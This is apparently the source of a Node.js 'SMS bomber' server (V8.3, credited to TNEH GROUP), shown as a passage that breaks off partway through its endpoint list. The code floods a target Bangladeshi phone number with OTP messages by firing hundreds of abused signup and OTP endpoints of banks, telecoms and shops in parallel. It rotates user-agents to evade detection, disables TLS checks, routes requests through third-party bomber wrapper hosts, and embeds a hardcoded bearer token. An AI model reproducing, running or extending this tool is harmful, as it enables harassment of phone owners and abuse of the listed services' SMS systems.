// ============================================================
// ULTIMATE SMS BOMBER V8.3 - api/index.js
// count=1 -> every API fires ONCE, all at the same time.
// No batch gate, no sleep(30), no retry ladder blocking.
// 400+ APIs in flight within ~1s of /api/spam.
// DEVELOPER: TNEH GROUP
// ============================================================

const express = require('express');
const axios = require('axios');
const http = require('http');
const https = require('https');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const EventEmitter = require('events');

// ============================================================
// CONFIG
// ============================================================
const CONFIG = {
  server: { port: process.env.PORT || 3000, host: '0.0.0.0' },
  performance: {
    // count=1 mode = EVERY API IN PARALLEL. No batching.
    fullBlastConcurrency: 9999,
    parallelRequests: 30,
    timeout: 8000,
    maxRetries: 0,           // no retry ladder — one shot per API
    retryDelay: 0,
    maxCountPerAPI: 500,
    keepAlive: true,
    maxSockets: 2048,
    maxFreeSockets: 512,
    socketTimeout: 12000
  },
  security: { rateLimit: { enabled: false, windowMs: 60000, maxRequests: 100000 } }
};

const DEVELOPER_INFO = {
  developer: "TNEH GROUP",
  telegram: "@tneh_owner",
  api_version: "8.3.0-BLAST",
  build_date: new Date().toISOString()
};

const ERROR_MESSAGES = {
  MISSING_PARAM: 'Missing required parameter',
  INVALID_PHONE: 'Invalid phone number format',
  INVALID_API_KEY: 'Invalid or expired API key',
  RATE_LIMIT: 'Rate limit exceeded',
  JOB_NOT_FOUND: 'Job not found',
  INTERNAL_ERROR: 'Internal server error'
};

// ============================================================
// SHARED HTTP AGENTS — keep-alive, huge socket pool
// ============================================================
const HTTPS_AGENT = new https.Agent({
  keepAlive: true,
  maxSockets: CONFIG.performance.maxSockets,
  maxFreeSockets: CONFIG.performance.maxFreeSockets,
  timeout: CONFIG.performance.socketTimeout,
  scheduling: 'fifo'
});
const HTTPS_AGENT_INSECURE = new https.Agent({
  keepAlive: true,
  maxSockets: CONFIG.performance.maxSockets,
  maxFreeSockets: CONFIG.performance.maxFreeSockets,
  timeout: CONFIG.performance.socketTimeout,
  rejectUnauthorized: false,
  scheduling: 'fifo'
});
const HTTP_AGENT = new http.Agent({
  keepAlive: true,
  maxSockets: CONFIG.performance.maxSockets,
  maxFreeSockets: CONFIG.performance.maxFreeSockets,
  timeout: CONFIG.performance.socketTimeout,
  scheduling: 'fifo'
});

// ============================================================
// UTILITY
// ============================================================
class Utility {
  static generateId() { return crypto.randomBytes(16).toString('hex'); }
  static generateJobId() {
    return `JOB_${Date.now().toString(36).toUpperCase()}_${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
  }
  static generateApiKey() {
    const r = crypto.randomBytes(24).toString('hex').toUpperCase();
    const t = Date.now().toString(36).toUpperCase();
    return `TNEH_${r}_${t}`;
  }
  static getCurrentTime() { return new Date().toLocaleTimeString('en-US', { hour12: true }); }
  static getISOString() { return new Date().toISOString(); }
  static sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
  static maskPhone(p) {
    if (!p || p.length < 7) return '***';
    return p.slice(0, 3) + '****' + p.slice(-3);
  }
  static parsePhone(p) { return String(p).replace(/[^0-9]/g, ''); }
  static isValidPhone(p) {
    const c = this.parsePhone(p);
    return /^(01|8801)[0-9]{9}$/.test(c);
  }
  static getRandomElement(a) { return a[Math.floor(Math.random() * a.length)]; }
  static shuffleArray(a) {
    const s = [...a];
    for (let i = s.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [s[i], s[j]] = [s[j], s[i]];
    }
    return s;
  }
  static randomString(len = 8) {
    const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let out = '';
    for (let i = 0; i < len; i++) out += c[Math.floor(Math.random() * c.length)];
    return out;
  }
  static randomName() {
    const names = ['Arif','Hasib','Kamrul','Sohag','Raihan','Farhan','Zahid','Imran','Sajib','Munna','Rakib','Noyon','Tusar','Shakib','Naim'];
    return this.getRandomElement(names);
  }
  static formatBytes(b) {
    if (b === 0) return '0 B';
    const k = 1024, sizes = ['B','KB','MB','GB'];
    const i = Math.floor(Math.log(b) / Math.log(k));
    return (b / Math.pow(k, i)).toFixed(2) + ' ' + sizes[i];
  }
  static getMemoryUsage() {
    const u = process.memoryUsage();
    return { rss: this.formatBytes(u.rss), heapUsed: this.formatBytes(u.heapUsed) };
  }
  static normalizeBD(phone) {
    const raw = String(phone).replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (raw.startsWith('880')) return raw;
    if (raw.startsWith('0')) return '880' + raw.slice(1);
    return '880' + raw;
  }
  static normalizePlus88(phone) { return '+' + this.normalizeBD(phone); }
}

// ============================================================
// USER AGENTS
// ============================================================
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/143.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
  'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Safari/605.1.15'
];

function getRandomHeaders(extra = {}) {
  return {
    'User-Agent': Utility.getRandomElement(USER_AGENTS),
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    ...extra
  };
}

// ============================================================
// API STATS TRACKER
// ============================================================
class ApiStatsTracker {
  constructor() { this.stats = new Map(); }
  record(apiId, apiName, success, responseTime, error = null) {
    if (!this.stats.has(apiId)) {
      this.stats.set(apiId, {
        id: apiId, name: apiName, calls: 0, success: 0, failed: 0,
        lastCall: null, lastError: null, avgResponseTime: 0, totalResponseTime: 0
      });
    }
    const s = this.stats.get(apiId);
    s.calls++; s.lastCall = Date.now();
    s.totalResponseTime += responseTime || 0;
    s.avgResponseTime = Math.round(s.totalResponseTime / s.calls);
    if (success) s.success++;
    else { s.failed++; if (error) s.lastError = String(error).slice(0, 200); }
  }
  getAll() { return Array.from(this.stats.values()).sort((a, b) => b.calls - a.calls); }
  getSummary() {
    const arr = this.getAll();
    return {
      total_apis_called: arr.length,
      total_calls: arr.reduce((s, a) => s + a.calls, 0),
      total_success: arr.reduce((s, a) => s + a.success, 0),
      total_failed: arr.reduce((s, a) => s + a.failed, 0)
    };
  }
  reset() { this.stats.clear(); }
}
const apiStatsTracker = new ApiStatsTracker();

// ============================================================
// BOMB CONTROLLER
// ============================================================
class BombController extends EventEmitter {
  constructor() {
    super();
    this.activeJobs = new Map();
    this.pausedJobs = new Map();
    this.completedJobs = new Map();
    this.globalPause = false;
    this.globalStop = false;
    this.stats = {
      totalJobs: 0, totalSMS: 0, totalSuccess: 0, totalFailed: 0,
      startTime: Date.now(), peakActiveJobs: 0
    };
  }
  registerJob(phone, totalCount, options = {}) {
    const jobId = Utility.generateJobId();
    const job = {
      id: jobId, phone, maskedPhone: Utility.maskPhone(phone),
      totalCount, sentCount: 0, successCount: 0, failCount: 0,
      startTime: Date.now(), status: 'active', options,
      progress: 0, errors: [], stopped: false, paused: false,
      inflight: 0
    };
    this.activeJobs.set(jobId, job);
    this.stats.totalJobs++;
    if (this.activeJobs.size > this.stats.peakActiveJobs)
      this.stats.peakActiveJobs = this.activeJobs.size;
    return jobId;
  }
  isJobActive(jobId) {
    if (this.globalStop || this.globalPause) return false;
    const j = this.activeJobs.get(jobId);
    return j && !j.stopped && !j.paused && j.status === 'active';
  }
  stopJob(jobId) {
    const j = this.activeJobs.get(jobId) || this.pausedJobs.get(jobId);
    if (!j) return false;
    j.stopped = true; j.status = 'stopped'; j.endTime = Date.now();
    this.activeJobs.delete(jobId);
    this.pausedJobs.delete(jobId);
    this.completedJobs.set(jobId, j);
    return true;
  }
  stopAllJobs() {
    this.globalStop = true;
    let c = 0;
    [...this.activeJobs.keys(), ...this.pausedJobs.keys()].forEach(id => {
      if (this.stopJob(id)) c++;
    });
    return c;
  }
  pauseJob(jobId) {
    const j = this.activeJobs.get(jobId);
    if (!j) return false;
    j.paused = true; j.status = 'paused';
    this.activeJobs.delete(jobId);
    this.pausedJobs.set(jobId, j);
    return true;
  }
  pauseAllJobs() {
    this.globalPause = true;
    let c = 0;
    [...this.activeJobs.keys()].forEach(id => { if (this.pauseJob(id)) c++; });
    return c;
  }
  resumeJob(jobId) {
    const j = this.pausedJobs.get(jobId);
    if (!j || j.stopped) return false;
    j.paused = false; j.status = 'active';
    this.pausedJobs.delete(jobId);
    this.activeJobs.set(jobId, j);
    return true;
  }
  resumeAllJobs() {
    this.globalPause = false; this.globalStop = false;
    let c = 0;
    [...this.pausedJobs.keys()].forEach(id => { if (this.resumeJob(id)) c++; });
    return c;
  }
  updateJobStats(jobId, success, error = null) {
    const j = this.activeJobs.get(jobId);
    if (!j || j.stopped || j.paused) return;
    j.sentCount++;
    if (success) { j.successCount++; this.stats.totalSuccess++; }
    else {
      j.failCount++; this.stats.totalFailed++;
      if (error) j.errors.push({ t: Date.now(), e: String(error).slice(0, 200) });
      if (j.errors.length > 50) j.errors.shift();
    }
    j.progress = ((j.sentCount / j.totalCount) * 100).toFixed(2);
    this.stats.totalSMS++;
    if (j.sentCount >= j.totalCount) {
      j.status = 'completed'; j.endTime = Date.now();
      this.activeJobs.delete(jobId);
      this.completedJobs.set(jobId, j);
    }
  }
  getJobStatus(jobId) {
    const j = this.activeJobs.get(jobId) || this.pausedJobs.get(jobId) || this.completedJobs.get(jobId);
    if (!j) return null;
    return {
      id: j.id, phone: j.maskedPhone, total: j.totalCount, sent: j.sentCount,
      success: j.successCount, fail: j.failCount, progress: j.progress + '%',
      status: j.status, startTime: j.startTime, endTime: j.endTime || null,
      stopped: j.stopped, paused: j.paused, errors: j.errors.slice(-5)
    };
  }
  getAllJobs() {
    const out = [];
    this.activeJobs.forEach(j => out.push(this.getJobStatus(j.id)));
    this.pausedJobs.forEach(j => out.push(this.getJobStatus(j.id)));
    this.completedJobs.forEach(j => out.push(this.getJobStatus(j.id)));
    return out;
  }
  getStats() {
    const total = this.stats.totalSuccess + this.stats.totalFailed;
    return {
      totalJobs: this.stats.totalJobs, totalSMS: this.stats.totalSMS,
      totalSuccess: this.stats.totalSuccess, totalFailed: this.stats.totalFailed,
      successRate: total > 0 ? ((this.stats.totalSuccess / total) * 100).toFixed(2) + '%' : '0%',
      activeJobs: this.activeJobs.size, pausedJobs: this.pausedJobs.size,
      completedJobs: this.completedJobs.size, peakActiveJobs: this.stats.peakActiveJobs,
      uptime: ((Date.now() - this.stats.startTime) / 1000).toFixed(2) + 's',
      memory: Utility.getMemoryUsage()
    };
  }
  clearCompleted() { const c = this.completedJobs.size; this.completedJobs.clear(); return c; }
}

// ============================================================
// MEGA LIST — 406 from external JSON, normalized
// ============================================================
const MEGA_APIS = [
  { id: 1001, name: "QuizGiri (JSON)", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp?phone={phone}&country_code=+880&fcm_token=null", headers: { "content-type": "application/json" } },
  { id: 1002, name: "Shudokko", method: "GET", url: "http://lpin.dev.mpower-social.com:6001/usermodule/otp_mobile/?mobile_no={phone}&email=xbomber_public%40gmail.com&verification_type=registration" },
  { id: 1003, name: "LStyle Web", method: "POST", url: "http://27.131.15.19/lstyle/api/lsotprequest", body: '{"shortcode":"2494905","msisdn":"88{phone}"}', headers: { "content-type": "application/json" } },
  { id: 1004, name: "Cinespot", method: "GET", url: "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-{phone}/operator-All/send" },
  { id: 1005, name: "Dhaka Bank", method: "POST", url: "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", body: '{"AccessToken":"","TrackingNo":"","mobileNo":"{phone}","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}', headers: { "content-type": "application/json" } },
  { id: 1006, name: "Circle Robi FCM", method: "POST", url: "https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn=88{phone}" },
  { id: 1007, name: "Health Plus 2", method: "GET", url: "http://45.114.85.19:8080/v3/otp/send?msisdn=88{phone}" },
  { id: 1008, name: "IQRA v2", method: "GET", url: "http://apibeta.iqra-live.com/api/v2/sent-otp/{phone}", headers: { "x-user-channel": "apps" } },
  { id: 1009, name: "Shajgoj OTP", method: "POST", url: "https://shop.shajgoj.com/wp-admin/admin-ajax.php", isFormData: true, body: { action: "xoo_ml_login_with_otp", "xoo-ml-phone-login": "{phone}", "xoo-ml-form-token": "4840", "xoo-ml-form-type": "login_user_with_otp", redirect: "/my-account/" }, headers: { "content-type": "application/x-www-form-urlencoded" } },
  { id: 1010, name: "KhaoDao", method: "POST", url: "https://api.eat-z.com/auth/customer/signin", body: '{"username":"+88{phone}"}', headers: { "content-type": "application/json" } },
  { id: 1011, name: "Alesha Card", method: "POST", url: "https://aleshacard.com/api/register-otp?contact_no={phone}" },
  { id: 1012, name: "TheMallBD", method: "POST", url: "https://themallbd.com/api/auth/otp_login", body: '{"phone_number":"+88{phone}"}', headers: { "content-type": "application/json" } },
  { id: 1013, name: "Fundesh Win", method: "POST", url: "https://win.fundesh.com.bd/authSrv/auth/generateOtp", body: '{"msisdn":"{phone}","clientId":"d2c_client"}', headers: { "content-type": "application/json" } },
  { id: 1014, name: "Circle Robi OTC", method: "POST", url: "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=13001&app_version=79&msisdn=88{phone}" },
  { id: 1015, name: "Vestige", method: "POST", url: "http://vstg-gateway-prod-1532961163.ap-south-1.elb.amazonaws.com/notification/api/v1/send/otp/v3", body: '{"mobileNumber":"88{phone}","countryId":22}', headers: { "content-type": "application/json" } },
  { id: 1016, name: "Ajkerdeal", method: "POST", url: "https://api.ajkerdeal.com/Recover/RetrivePassword/customersignup=null", body: '{"CustomerId":"01833268701","MobileOrEmail":"{phone}","Type":2}', headers: { "content-type": "application/json" } },
  { id: 1017, name: "Arogga Old", method: "POST", url: "https://api.arogga.com/v1/auth/sms/send?f=mobile&b=Chrome&v=101.0.4951.54&os=Android&osv=6.0", isFormData: true, body: { mobile: "+88{phone}", fcmToken: "", referral: "" } },
  { id: 1018, name: "OsudPotro v2", method: "POST", url: "https://api-2.osudpotro.com/api/v1/users/send_otp", body: '{"mobile":"+88-{phone}","deviceToken":"web","language":"en","os":"web"}', headers: { "content-type": "application/json" } },
  { id: 1019, name: "Nesco", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", isFormData: true, body: { phone_number: "{phone}" } },
  { id: 1020, name: "Robi Web Old", method: "POST", url: "https://webapi.robi.com.bd/v1/send-otp", body: '{"phone_number":"{phone}"}', headers: { "content-type": "application/json", "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dlYmFwaS5yb2JpLmNvbS5iZC92MS90b2tlbiIsImlhdCI6MTY1Mjk2MTAyOSwiZXhwIjoxNjUzMDQ3NDI5LCJuYmYiOjE2NTI5NjEwMjksImp0aSI6IjBXSW9ld0U3bzFJRVNHTVUiLCJzdWIiOiJSb2JpV2ViU2l0ZSJ9.lxP2K3WU36mO8By_dNiVO3VYOSajRofD-Rhqb-0y8ok" } },
  { id: 1021, name: "Bongo", method: "POST", url: "https://api.bongo-solutions.com/auth/api/login/send-otp", body: '{"operator":"all","msisdn":"88{phone}"}', headers: { "content-type": "application/json" } },
  { id: 1022, name: "Ali2BD", method: "POST", url: "https://edge.ali2bd.com/api/consumer/v1/auth/login", body: '{"username":"+88{phone}"}', headers: { "content-type": "application/json" } },
  { id: 1023, name: "Admission BD", method: "POST", url: "https://api.arifmodz.my.id/V2/admissionbd.php?phone={phone}" },
  { id: 1024, name: "Ali2BD wrapper", method: "POST", url: "https://api.arifmodz.my.id/V2/ali2bd.php?phone={phone}" },
  { id: 1025, name: "AppLink wrapper", method: "POST", url: "https://api.arifmodz.my.id/V2/applink.php?phone={phone}" },
  { id: 1026, name: "Arogga wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/arogga.php?phone={phone}" },
  { id: 1027, name: "Bikroy wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/bikroy.php?phone={phone}" },
  { id: 1028, name: "MuBl", method: "GET", url: "https://api.arifmodz.my.id/V2/bl.php?phone={phone}" },
  { id: 1029, name: "ChinaOnline wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/chainaonline.php?phone={phone}" },
  { id: 1030, name: "Chokrojan wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/chakrajan.php?phone={phone}" },
  { id: 1031, name: "Chorki wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/chorki.php?phone={phone}" },
  { id: 1032, name: "Circle wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/circel.php?phone={phone}" },
  { id: 1033, name: "DhakaBank wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/dhakabank.php?phone={phone}" },
  { id: 1034, name: "Deepto wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/dipto.php?phone={phone}" },
  { id: 1035, name: "Doctime wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/doctime.php?phone={phone}" },
  { id: 1036, name: "Easy wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/easy.com.bd.php?phone={phone}" },
  { id: 1037, name: "Ecourier wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/ecuriar.php?phone={phone}" },
  { id: 1038, name: "Flexiplan wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/flexi-plan.php?phone={phone}" },
  { id: 1039, name: "Fliper wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/fliper.php?phone={phone}" },
  { id: 1040, name: "Fundesh wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/fundesh.php?phone={phone}" },
  { id: 1041, name: "Ghuri wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/ghuri.php?phone={phone}" },
  { id: 1042, name: "GP wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/gp.php?phone={phone}" },
  { id: 1043, name: "GP Shop wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/gpshop.php?phone={phone}" },
  { id: 1044, name: "Hishab Express wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/hisab-express.php?phone={phone}" },
  { id: 1045, name: "Hishab Login wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/hisabelogin.php?phone={phone}" },
  { id: 1046, name: "IVR wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/ivr.php?phone={phone}" },
  { id: 1047, name: "Jeetwin wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/jeetwinbd.php?phone={phone}" },
  { id: 1048, name: "Jotno wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/jotno.php?phone={phone}" },
  { id: 1049, name: "MCB wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/mcbaffiliate.php?phone={phone}" },
  { id: 1050, name: "Mokam wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/mokam.php?phone={phone}" },
  { id: 1051, name: "Moveon wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/moveon.php?phone={phone}" },
  { id: 1052, name: "Obhai wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/obhai.php?phone={phone}" },
  { id: 1053, name: "Robi MyOffer wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/robi-myoffer.php?phone={phone}" },
  { id: 1054, name: "Robi Web wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/robi-web.php?phone={phone}" },
  { id: 1055, name: "Robi Web 2 wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/robi-web2.php?phone={phone}" },
  { id: 1056, name: "RTV Register wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/rtv-reg.php?phone={phone}" },
  { id: 1057, name: "RTV Forget wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/rtv-forget.php?phone={phone}" },
  { id: 1058, name: "Shadhin wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/sadhin.php?phone={phone}" },
  { id: 1059, name: "Shajgoj wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/sajgoj.php?phone={phone}" },
  { id: 1060, name: "Shopoth Reg wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/sopoth-reg.php?phone={phone}" },
  { id: 1061, name: "Shopoth Resend wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/sopoth-resend.php?phone={phone}" },
  { id: 1062, name: "Talikhata wrapper", method: "GET", url: "https://api.arifmodz.my.id/V2/talikhata.php?phone={phone}" },
  { id: 1063, name: "Bkash via sineorbiz", method: "GET", url: "https://www.sineorbiz.com/wp-content/plugins/bkash.php?phone={phone}" },
  { id: 1064, name: "Toka SMS", method: "GET", url: "https://www.tokaweb.xyz/sms.php?number={phone}&sms=Hi" },
  { id: 1065, name: "Shopoth Direct", method: "POST", url: "https://api.shopoth.com/shop/api/v1/otps/send", body: '{"phone":"{phone}"}', headers: { "content-type": "application/json" } },
  { id: 1066, name: "Paperfly (direct)", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: '{"full_name":"BLACKFIRE","company_name":"Bomber","email_address":"blactfiretools@gmail.com","phone_number":"{phone}"}', headers: { "content-type": "application/json" } },
  { id: 1067, name: "8m-forget", method: "GET", url: "https://api.blackfire-tools.xyz/8m-forget.php?phone={phone}" },
  { id: 1068, name: "b8m-reg", method: "GET", url: "https://api.blackfire-tools.xyz/b8m-reg.php?phone={phone}" },
  { id: 1069, name: "admissionbd", method: "GET", url: "https://api.blackfire-tools.xyz/admissionbd.php?phone={phone}" },
  { id: 1070, name: "aibl", method: "GET", url: "https://api.blackfire-tools.xyz/aibl.php?phone={phone}" },
  { id: 1071, name: "ail2bd", method: "GET", url: "https://api.blackfire-tools.xyz/ali2bd.php?phone={phone}" },
  { id: 1072, name: "apex", method: "GET", url: "https://api.blackfire-tools.xyz/apex.php?phone={phone}" },
  { id: 1073, name: "applink", method: "GET", url: "https://api.blackfire-tools.xyz/applink.php?phone={phone}" },
  { id: 1074, name: "arogga", method: "GET", url: "https://api.blackfire-tools.xyz/arogga.php?phone={phone}" },
  { id: 1075, name: "bdtikets", method: "GET", url: "https://api.blackfire-tools.xyz/bdtikets.php?phone={phone}" },
  { id: 1076, name: "bdtikets2", method: "GET", url: "https://api.blackfire-tools.xyz/bdtikets2.php?phone={phone}" },
  { id: 1077, name: "betonbook", method: "GET", url: "https://api.blackfire-tools.xyz/betonbook.php?phone={phone}" },
  { id: 1078, name: "bikroy", method: "GET", url: "https://api.blackfire-tools.xyz/bikroy.php?phone={phone}" },
  { id: 1079, name: "bioscope", method: "GET", url: "https://api.blackfire-tools.xyz/bioscope.php?phone={phone}" },
  { id: 1080, name: "bjbaji", method: "GET", url: "https://api.blackfire-tools.xyz/bjbaji.php?phone={phone}" },
  { id: 1081, name: "bkash", method: "GET", url: "https://api.blackfire-tools.xyz/bkash.php?phone={phone}" },
  { id: 1082, name: "bl", method: "GET", url: "https://api.blackfire-tools.xyz/bl.php?phone={phone}" },
  { id: 1083, name: "bongobd", method: "GET", url: "https://api.blackfire-tools.xyz/bongobd.php?phone={phone}" },
  { id: 1084, name: "busbdlogin", method: "GET", url: "https://api.blackfire-tools.xyz/busbdlogin.php?phone={phone}" },
  { id: 1085, name: "chainaonline", method: "GET", url: "https://api.blackfire-tools.xyz/chainaonline.php?phone={phone}" },
  { id: 1086, name: "chakrajan", method: "GET", url: "https://api.blackfire-tools.xyz/chakrajan.php?phone={phone}" },
  { id: 1087, name: "chorki (post)", method: "POST", url: "https://api.blackfire-tools.xyz/chorki.php?phone={phone}" },
  { id: 1088, name: "cinematic", method: "GET", url: "https://api.blackfire-tools.xyz/cinematic.php?phone={phone}" },
  { id: 1089, name: "cineplex", method: "GET", url: "https://api.blackfire-tools.xyz/cineplex.php?phone={phone}" },
  { id: 1090, name: "cinespot", method: "GET", url: "https://api.blackfire-tools.xyz/cinespot.php?phone={phone}" },
  { id: 1091, name: "circel", method: "GET", url: "https://api.blackfire-tools.xyz/circel.php?phone={phone}" },
  { id: 1092, name: "daktarbhai", method: "GET", url: "https://api.blackfire-tools.xyz/daktarbhai.php?phone={phone}" },
  { id: 1093, name: "dhakabank", method: "GET", url: "https://api.blackfire-tools.xyz/dhakabank.php?phone={phone}" },
  { id: 1094, name: "dipto", method: "GET", url: "https://api.blackfire-tools.xyz/dipto.php?phone={phone}" },
  { id: 1095, name: "dmss", method: "GET", url: "https://api.blackfire-tools.xyz/dmss.php?phone={phone}" },
  { id: 1096, name: "doctime", method: "GET", url: "https://api.blackfire-tools.xyz/doctime.php?phone={phone}" },
  { id: 1097, name: "easy.com.bd", method: "GET", url: "https://api.blackfire-tools.xyz/easy.com.bd.php?phone={phone}" },
  { id: 1098, name: "ecuriar", method: "GET", url: "https://api.blackfire-tools.xyz/ecuriar.php?phone={phone}" },
  { id: 1099, name: "engage-token", method: "GET", url: "https://api.blackfire-tools.xyz/engage-token.php?phone={phone}" },
  { id: 1100, name: "engage", method: "GET", url: "https://api.blackfire-tools.xyz/engage.php?phone={phone}" },
  { id: 1101, name: "enobazar", method: "GET", url: "https://api.blackfire-tools.xyz/enobazar.php?phone={phone}" },
  { id: 1102, name: "entertainment", method: "GET", url: "https://api.blackfire-tools.xyz/entertainment.php?phone={phone}" },
  { id: 1103, name: "eshop-bl", method: "GET", url: "https://api.blackfire-tools.xyz/eshop-bl.php?phone={phone}" },
  { id: 1104, name: "flexi-plan", method: "GET", url: "https://api.blackfire-tools.xyz/flexi-plan.php?phone={phone}" },
  { id: 1105, name: "fliper", method: "GET", url: "https://api.blackfire-tools.xyz/fliper.php?phone={phone}" },
  { id: 1106, name: "food-collection", method: "GET", url: "https://api.blackfire-tools.xyz/food-collection.php?phone={phone}" },
  { id: 1107, name: "fsibl", method: "GET", url: "https://api.blackfire-tools.xyz/fsibl.php?phone={phone}" },
  { id: 1108, name: "fundesh", method: "GET", url: "https://api.blackfire-tools.xyz/fundesh.php?phone={phone}" },
  { id: 1109, name: "ghuri", method: "GET", url: "https://api.blackfire-tools.xyz/ghuri.php?phone={phone}" },
  { id: 1110, name: "gibinfo", method: "GET", url: "https://api.blackfire-tools.xyz/gibinfo.php?phone={phone}" },
  { id: 1111, name: "gp", method: "GET", url: "https://api.blackfire-tools.xyz/gp.php?phone={phone}" },
  { id: 1112, name: "gpay", method: "GET", url: "https://api.blackfire-tools.xyz/gpay.php?phone={phone}" },
  { id: 1113, name: "gpfi", method: "GET", url: "https://api.blackfire-tools.xyz/gpfi.php?phone={phone}" },
  { id: 1114, name: "gpshop", method: "GET", url: "https://api.blackfire-tools.xyz/gpshop.php?phone={phone}" },
  { id: 1115, name: "grameendh", method: "GET", url: "https://api.blackfire-tools.xyz/grameendh.php?phone={phone}" },
  { id: 1116, name: "helth-login", method: "GET", url: "https://api.blackfire-tools.xyz/helth-login.php?phone={phone}" },
  { id: 1117, name: "helth-reg", method: "GET", url: "https://api.blackfire-tools.xyz/helth-reg.php?phone={phone}" },
  { id: 1118, name: "helth", method: "GET", url: "https://api.blackfire-tools.xyz/helth.php?phone={phone}" },
  { id: 1119, name: "hisab-express", method: "GET", url: "https://api.blackfire-tools.xyz/hisab-express.php?phone={phone}" },
  { id: 1120, name: "hisabereg", method: "GET", url: "https://api.blackfire-tools.xyz/hisabereg.php?phone={phone}" },
  { id: 1121, name: "hlpl", method: "GET", url: "https://api.blackfire-tools.xyz/hlpl.php?phone={phone}" },
  { id: 1122, name: "hoichoi", method: "GET", url: "https://api.blackfire-tools.xyz/hoichoi.php?phone={phone}" },
  { id: 1123, name: "iqra", method: "GET", url: "https://api.blackfire-tools.xyz/iqra.php?phone={phone}" },
  { id: 1124, name: "ivr", method: "GET", url: "https://api.blackfire-tools.xyz/ivr.php?phone={phone}" },
  { id: 1125, name: "jatri", method: "GET", url: "https://api.blackfire-tools.xyz/jatri.php?phone={phone}" },
  { id: 1126, name: "jeetwinbd", method: "GET", url: "https://api.blackfire-tools.xyz/jeetwinbd.php?phone={phone}" },
  { id: 1127, name: "jotno", method: "GET", url: "https://api.blackfire-tools.xyz/jotno.php?phone={phone}" },
  { id: 1128, name: "kabbik", method: "GET", url: "https://api.blackfire-tools.xyz/kabbik.php?phone={phone}" },
  { id: 1129, name: "kirebd", method: "GET", url: "https://api.blackfire-tools.xyz/kirebd.php?phone={phone}" },
  { id: 1130, name: "kormi24", method: "GET", url: "https://api.blackfire-tools.xyz/kormi24.php?phone={phone}" },
  { id: 1131, name: "lazzpharma", method: "GET", url: "https://api.blackfire-tools.xyz/lazzpharma.php?phone={phone}" },
  { id: 1132, name: "ibfl", method: "GET", url: "https://api.blackfire-tools.xyz/ibfl.php?phone={phone}" },
  { id: 1133, name: "loan", method: "GET", url: "https://api.blackfire-tools.xyz/loan.php?phone={phone}" },
  { id: 1134, name: "mcbaffiliate", method: "GET", url: "https://api.blackfire-tools.xyz/mcbaffiliate.php?phone={phone}" },
  { id: 1135, name: "mithai", method: "GET", url: "https://api.blackfire-tools.xyz/mithai.php?phone={phone}" },
  { id: 1136, name: "mojaenglish", method: "GET", url: "https://api.blackfire-tools.xyz/mojaenglish.php?phone={phone}" },
